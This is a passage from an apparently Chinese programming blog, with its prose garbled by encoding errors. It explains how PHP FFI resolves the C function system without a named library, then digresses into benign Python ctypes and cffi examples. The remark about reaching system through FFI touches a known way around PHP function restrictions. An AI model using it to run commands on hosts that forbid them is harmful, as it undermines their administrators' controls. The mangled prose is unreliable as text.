&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‘ç°åœ¨æ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸æ‰§è¡Œsystemå‡½æ•°ï¼Œçœ‹ä¸‹&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/ext/ffi/ffi.c#L2853-L2879">æºç &lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202231908072.png" alt="image-20211202231908072">&lt;/p>
&lt;p>è¿™ç§æƒ…å†µä¸‹lib=NULLï¼Œhandle=RTLD_DEFAULTï¼ˆè¿™ä¸ªæ³¨é‡ŠTODOå°±å¾ˆçµæ€§ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232422896.png" alt="image-20211202232422896">&lt;/p>
&lt;p>éšåè°ƒç”¨&lt;code>DL_FETCH_SYMBOL&lt;/code>ï¼Œ&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/Zend/zend_portability.h#L166-L168">ä¹Ÿå°±æ˜¯&lt;/a>dlsysm&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232601190.png" alt="image-20211202232601190">&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>RTLD_DEFAULT&lt;/strong>&lt;/p>
&lt;p>Find the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the &lt;strong>RTLD_GLOBAL&lt;/strong>flag.&lt;/p>
&lt;/blockquote>
&lt;p>å½“dlsymç¬¬ä¸€ä¸ªå‚æ•°ä¸ºRTLD_DEFAULTæ—¶ï¼Œä¼šæŒ‰ç…§é»˜è®¤å…±äº«åº“é¡ºåºæŸ¥æ‰¾systemçš„ä½ç½®ï¼Œæœç´¢èŒƒå›´è¿˜åŒ…æ‹¬äº†å¯æ‰§è¡Œç¨‹åºæå…¶ä¾èµ–ä¸­çš„å‡½æ•°è¡¨ï¼ˆå¦‚æœè®¾ç½®äº† RTLD_GLOBALè¿˜ä¼šæœç´¢åŠ¨æ€åŠ è½½åº“ä¸­çš„å‡½æ•°è¡¨ï¼‰ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥åœ¨å…¨å±€ç¬¦å·è¡¨é‡Œæ‰¾äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦æŒ‡å®šåŠ è½½åº“ï¼Œfopenè¿™ç±»å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·&lt;/p>
&lt;p>æ›´å¤šçš„æ —å­è¯·å‚è§&lt;a href="https://wiki.php.net/rfc/ffi">æ–‡æ¡£&lt;/a>å’Œ&lt;a href="https://www.laruence.com/2020/03/11/5475.html">è¿™ä¸€ç¯‡æ–‡ç« &lt;/a>ï¼Œå†™çš„éƒ½å¾ˆè¯¦ç»†&lt;/p>
&lt;h3 id="è·‘ä¸ªé¢˜ffi-in-python">è·‘ä¸ªé¢˜ï¼šFFI in Python&lt;/h3>
&lt;p>Pythonçš„ä¼˜ç‚¹å°±ä¸å¿…è¯´äº†ï¼Œç¼ºç‚¹æ˜¯å°è£…å¤ªå¥½äº†å¯¼è‡´è¿è¡Œé€Ÿåº¦ä¸Šä¸å»ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨Pythonä¸­ç”¨C/C++å‘¢ï¼Ÿ&lt;/p>
&lt;p>è‚¥è‚ ä¸é”™çš„æƒ³æ³•ï¼ä¸è¿‡è¦è§£å†³çš„æœ‰ä¸¤ä¸ªé—®é¢˜ï¼šMarshallingï¼ˆæ„Ÿè§‰ç¼–ç»„è¿™ä¸ªç¿»è¯‘å¾ˆå¥‡æ€ª ä½†æ˜¯è¿™ä¸ªè¡Œä¸ºå¯ä»¥ç±»æ¯”ä¸€ä¸‹serializeï¼‰ &amp;amp; Manageing Memoryï¼ˆå†…å­˜ç®¡ç†ï¼‰&lt;/p>
&lt;ul>
&lt;li>Pythonä¸­ä¸‡ç‰©çš†objectï¼Œè€ŒCä¸­æœ‰ä¸¥æ ¼çš„int floatç­‰ç­‰ç±»å‹&lt;/li>
&lt;li>Pythonæœ‰gcï¼Œè€ŒCä¸­éœ€è¦æ‰‹åŠ¨malloc&lt;/li>
&lt;/ul>
&lt;p>ä¸è¿‡ä¸æ€¥ï¼Œå·²ç»æœ‰åº“å°è£…å¥½äº†è¿™äº›åŠŸèƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ¥åº·åº·demo&lt;/p>
&lt;h4 id="ctypesåº“">ctypesåº“&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#75af00">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;In cadd: int %d float %.1f returning %.1f&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75715e"># load the lib&lt;/span>
&lt;span style="color:#111">libname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Path&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">absolute&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#d88200">&amp;#34;libcadd.so&amp;#34;&lt;/span>
&lt;span style="color:#111">c_lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">libname&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.3&lt;/span>
&lt;span style="color:#75715e"># define the return type&lt;/span>
&lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>
&lt;span style="color:#75715e"># call the function with the correct argument types&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;In python: int: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> float &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> return val &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">.1f&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c
$ python3 test.py
In cadd: int &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 returning 8.3
In python: int: &lt;span style="color:#ae81ff">6&lt;/span> float 2.3 &lt;span style="color:#00a8c8">return&lt;/span> val 8.3
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173119818.png" alt="image-20211202173119818">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆåŠŸè°ƒç”¨äº†cadd.soï¼Œè€Œæˆ‘ä»¬åœ¨pythonä¸­è¦åšçš„åªæœ‰åŠ è½½.so-&amp;gt;è®¾ç½®ç¬¦åˆCæ ‡å‡†çš„è¿”å›å€¼ç±»å‹-&amp;gt;è°ƒç”¨ï¼Œè‚¥è‚ çš„ç®€å•&lt;/p>
&lt;p>ä¸è¿‡æ ‡å‡†åº“ctypesæœ‰ä¸€äº›ç¼ºé™· å¹¶ä¸”ä¸èƒ½æ‹“å±•å¤§å‹é¡¹ç›®ï¼Œé‰´äºæ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨cffiåº“&lt;/p>
&lt;h4 id="cffiåº“">cffiåº“&lt;/h4>
&lt;p>è¿™é‡Œæ˜¯ä¸€ä¸ªhello worldçš„å°demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75715e"># å¯ä»¥å®šä¹‰å‡½æ•° ç»“æ„ä½“ å˜é‡&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> int printf(const char *format, ...);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># åŠ è½½cå‘½åç©ºé—´&lt;/span>
&lt;span style="color:#111">arg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;char[]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># å³ char arg[]=&amp;#34;world&amp;#34;;&lt;/span>
&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">arg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªæ —å­é‡Œç›´æ¥åœ¨ä¸€ä¸ªpyæ–‡ä»¶ä¸­ç”¨cffiè°ƒç”¨åº“å‡½æ•°å°±ç»“æŸäº†ï¼Œè‚¥è‚ è‚¥è‚ çš„ç®€å•ï¼›æˆ–è€…ä¹Ÿå¯ä»¥å’Œctypesä¸€æ ·ï¼Œå•ç‹¬å†™ä¸€ä¸ªcå…ˆ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">Tprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello, world&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åè°ƒç”¨&lt;code>ffi.verify()&lt;/code>åœ¨Pythonä¸­åŠ è½½å’Œä½¿ç”¨ï¼Œä¸è¿‡è¿˜éœ€è¦é¢å¤–å£°æ˜å‡½æ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> int Tadd(int a, int b);
&lt;/span>&lt;span style="color:#d88200"> void Tprint(void);
&lt;/span>&lt;span style="color:#d88200"> int Tmul(int a, int b);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sources&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uu.c&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tprint&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202180822923.png" alt="image-20211202180822923">&lt;/p>
&lt;p>ä»¥ä¸Šæ–¹å¼éƒ½æ˜¯åœ¨çº¿apiæ¨¡å¼ï¼Œcffiè¿˜æ”¯æŒç¦»çº¿apiæ¨¡å¼ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªdemo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> double sqrt(double x);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># éœ€è¦çš„å¤´æ–‡ä»¶&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_libmath&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> #include &amp;lt;math.h&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">library_dirs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[],&lt;/span>
&lt;span style="color:#111">libraries&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">verbose&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python build_cffi.py
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">_libmath&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">lib&lt;/span>
&lt;span style="color:#75715e"># ç›´æ¥è°ƒç”¨cå‡½æ•°&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sqrt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">F&lt;/span>&lt;span style="color:#d88200">&amp;#34;The square root of 4.5 is &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python test.py
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173047579.png" alt="image-20211202173047579">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå…ˆç”¨ä¸€ä¸ªpyæ–‡ä»¶è°ƒç”¨.hæ¥ç¼–è¯‘ç”Ÿæˆ.soå’Œ.cï¼Œç„¶ååœ¨å¦ä¸€ä¸ªpyæ–‡ä»¶ä¸­è°ƒç”¨.cå³å¯&lt;/p>
&lt;p>æˆ–è€…è¿˜æœ‰ç¬¬ä¸‰ç§æ–¹å¼ï¼Œåœ¨Pythonä¸­ä½¿ç”¨å¤–éƒ¨å·²ç»å®šä¹‰å¥½çš„cåº“å‡½æ•°ï¼›è¿™é‡Œä½¿ç”¨&lt;a href="https://github.com/wolever">wolever&lt;/a>/&lt;a href="https://github.com/wolever/python-cffi-example">python-cffi-example&lt;/a>æ¥æ¼”ç¤ºï¼ˆ&lt;del>å°±ä¸å¤åˆ¶ç²˜è´´äº†æ&lt;/del> å°±ç²˜å°±ç²˜&lt;/p>
&lt;p>é¦–å…ˆæ˜¯ä¸€ä¸ª&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/fnmatch.h#L1-L18">fnmatch.h&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202184827657.png" alt="image-20211202184827657">&lt;/p>
&lt;p>æ³¨æ„7 8 9è¡Œè¦æ”¹ä¸€ä¸‹çš„ï¼Œæ ¹æ®/usr/include/fnmatch.hæ”¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202185217525.png" alt="image-20211202185217525">&lt;/p>
&lt;p>è¿™æ˜¯&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/build_fnmatch.py#L1">build_fnmatch.py&lt;/a>ï¼Œç”¨äºç”Ÿæˆæ¨¡å—åœ¨fnmatch.pyä¸­ä½¿ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi_example._fnmatch&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75715e"># Since we are calling fnmatch directly no custom source is necessary. We&lt;/span>
&lt;span style="color:#75715e"># need to #include &amp;lt;fnmatch.h&amp;gt;, though, because behind the scenes cffi&lt;/span>
&lt;span style="color:#75715e"># generates a .c file which contains a Python-friendly wrapper around&lt;/span>
&lt;span style="color:#75715e"># ``fnmatch``:&lt;/span>
&lt;span style="color:#75715e"># static PyObject *&lt;/span>
&lt;span style="color:#75715e"># _cffi_f_fnmatch(PyObject *self, PyObject *args) {&lt;/span>
&lt;span style="color:#75715e"># ... setup ...&lt;/span>
&lt;span style="color:#75715e"># result = fnmatch(...);&lt;/span>
&lt;span style="color:#75715e"># return PyInt_FromLong(result);&lt;/span>
&lt;span style="color:#75715e"># }&lt;/span>
&lt;span style="color:#d88200">&amp;#34;#include &amp;lt;fnmatch.h&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75715e"># The important thing is to inclue libc in the list of libraries we&amp;#39;re&lt;/span>
